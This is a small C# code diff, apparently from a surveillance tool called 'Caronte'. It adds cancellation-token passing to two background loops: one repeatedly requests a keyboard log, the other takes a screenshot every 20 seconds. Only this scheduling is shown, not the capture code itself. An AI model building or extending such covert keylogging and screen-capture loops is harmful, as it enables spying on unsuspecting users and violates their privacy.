@@ -14,7 +14,7 @@ namespace Caronte.Modules.Information
             var logTask = Task.Run(async () =>
             {
                 while (!_cancellationToken.IsCancellationRequested)
-                    await _mediator.Send(new GetKeyboardLogQuery());
+                    await _mediator.Send(new GetKeyboardLogQuery(), _cancellationToken);
             }, _cancellationToken);
 
             return logTask;
@@ -26,7 +26,7 @@ namespace Caronte.Modules.Information
             {
                 while (!_cancellationToken.IsCancellationRequested)
                 {
-                    await _mediator.Send(new PrintScreenQuery());
+                    await _mediator.Send(new PrintScreenQuery(), _cancellationToken);
                     await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
                 }
             }, _cancellationToken);
